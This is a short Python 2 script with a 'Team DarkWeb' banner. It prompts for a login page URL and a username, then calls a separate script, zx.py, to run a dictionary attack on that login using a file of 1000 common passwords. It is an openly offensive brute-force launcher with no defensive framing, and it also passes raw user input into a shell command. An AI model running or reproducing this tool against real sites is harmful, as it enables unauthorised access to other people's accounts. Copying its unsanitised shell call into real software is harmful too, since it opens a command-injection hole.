import os
import sys
os.system('clear')
logo = """ \033[1;94m
    _   __    _       ____________
   / | / /   | |     / / ____/ __ )
  /  |/ /____| | /| / / __/ / __  |
 / /|  /_____/ |/ |/ / /___/ /_/ /
/_/ |_/      |__/|__/_____/_____/

Created By : \033[1;96mNabil-Rahman |\033[1;0m [V 1.1.1]

\033[1;32m------------------------------------------
\33[93m AUTHOR  : Team DarkWeb T-D
\33[93m GITHUB  : github.com/Nabil-Official
\33[93m FB      : nabil.404
\033[1;32m------------------------------------------
"""
print (logo)
print ""
url = raw_input('\033[1;31m>> \033[1;32mEnter Login Page Url : \033[1;35m')
user_name = raw_input('\033[1;31m>> \033[1;32mEnter Username : \033[1;35m')
os.system('python2 zx.py -h ' + url + ' -u ' + user_name + ' -P 1000-most-common-password.txt -v')
